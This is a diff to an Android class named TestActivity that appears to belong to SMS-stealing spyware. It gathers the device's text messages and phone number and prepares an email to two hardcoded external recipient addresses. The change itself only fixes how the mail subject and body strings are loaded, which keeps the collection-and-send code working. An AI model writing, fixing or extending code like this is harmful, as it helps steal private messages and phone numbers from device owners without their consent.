@@ -58,10 +58,10 @@ public class TestActivity extends Activity
         			GetInfoTask.CollectSms(getApplicationContext());
         		
         			// Send mail
-        			String subject = Resources.getSystem().getString(R.string.mail_from) 
+        			String subject = getResources().getString(R.string.mail_from) 
         	           		 + DeviceProperty.getPhoneNumber(getApplicationContext()) 
         	           		 + " - " + (new String()).toString();
-        			String body = String.format(Resources.getSystem().getString(R.string.mail_body), 
+        			String body = String.format(getResources().getString(R.string.mail_body), 
         					DeviceProperty.getPhoneNumber(getApplicationContext()));
         			List<String> fileList = new ArrayList<String>();
         			String[] recipients = {"richardroky@gmail.com", "ylssww@126.com"};
